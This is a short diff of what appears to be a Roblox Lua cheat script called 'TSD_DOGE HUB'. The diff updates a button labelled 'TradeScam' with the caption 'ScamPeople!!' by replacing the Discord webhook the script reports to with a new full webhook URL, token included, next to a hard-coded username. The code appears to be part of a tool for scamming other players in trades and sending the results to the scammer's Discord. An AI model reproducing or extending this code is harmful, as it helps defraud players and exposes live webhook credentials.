@@ -6,7 +6,7 @@
 
   TradeScamSection:NewButton("TradeScam", "ScamPeople!!", function()
 Username = "jiegamingstido"
-WebHook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm"
+WebHook = "https://discord.com/api/webhooks/1072084022894796892/tsqMUO66-F_gjNvPXNbgLqQpsZ_eKpGgDR8cs7aSfZXfMSwW8aJonRRDJCyanLCbLWVs"
 
 _G.CustomScriptName = "TSD_DOGE HUB"
 _G.Text1 = "Script Loaded..."
